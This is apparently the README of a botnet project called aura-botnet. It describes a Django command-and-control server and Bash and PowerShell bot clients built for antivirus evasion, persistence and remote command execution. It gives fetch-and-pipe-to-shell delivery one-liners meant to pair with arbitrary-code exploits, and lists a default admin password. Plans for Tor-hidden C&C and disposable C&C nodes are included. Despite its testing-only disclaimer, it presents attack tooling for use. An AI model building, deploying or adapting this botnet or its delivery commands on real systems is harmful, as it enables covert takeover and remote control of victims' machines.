# aura-botnet

<h2>This repo is for testing purposes only. This is not meant to be
implemented in any real world applications except for demonstrations.</h2>

C&C Server
---
The botnet's central C&C server utilizes Django as the
backend because of its portability. It is currently configured with a simple
setup for mysql but can easily be configured for sqlite or postgresql thanks to
Django. The current configuration for the database can be changed in the
*settings.py* file under django-server/aura. You would, of course, need to setup
 the database on your machine. The admin user "aura" can be changed and
 configured using *manage.py*. The default admin password is "testing123".

Bot Clients
---
The clients are written in Bash and Powershell for simplicity and increased
chance of AV evasion. The script simply needs to be run in the same folder as
the other components or installed via web delivery. It will then create a file
containing random data which will then be hashed each time the client runs to
authenticate with the C&C server. It will then install all the files and
initialize the system service or task. Lastly, system information is sent to the
C&C server to register the new bot and everything will installed with the
privileges of the current user.

The clients periodically communicate with a specified server using POST requests
to receive a command. Commands can be configured on the C&C server for
bot groups that are defined by operating system and user privilege. This is
specified in django-server/groups.json. You can also assign commands to
individual bots and set default commands. Each command can be given a start
time and end time. These can easily be managed through the Django shell or admin
console located at http://your-django-server:portnumber/admin

Client Web Delivery
---
The *static* folder contains files to be served by a web server -- preferably
an nginx server running on a different port or host as your Django server --
It contains the packaged payloads and scripts that can be easily executed. The
simplicity of it makes it easy to integrate with exploits that run arbitrary
code. An example in bash would be:

```
curl http://static-server-name/welcome/linux/ | bash
```
or the following in Powershell:
```
Invoke-RestMethod http://static-server-name/welcome/linux/ | powershell
```

Misc.
---
Because this is for testing purposes, the C&C server needs to be
hard-coded into client and web delivery files. It is currently set to
localhost on all the files. This is because an actual botnet would use something
like a domain generation algorithm (DGA) to sync a stream of changing domains on
the client side with a stream of disposable domains being registered. I don't
wish to spend money for a small project. I do hope to implement a system that
can turn certain bots into "nodes", or disposable command and control servers,
at some point in time.

The *killswitch* folder contains scripts for easy client removal when testing
on your devices.

<b>Future Feature Considerations</b>
- Create system to allow for oneshot commands
- Implement compatibility with running C&C as a hidden Tor service
- Design system to make certain bots into node servers that act as disposable
command and control servers
- Create clients for mobile devices
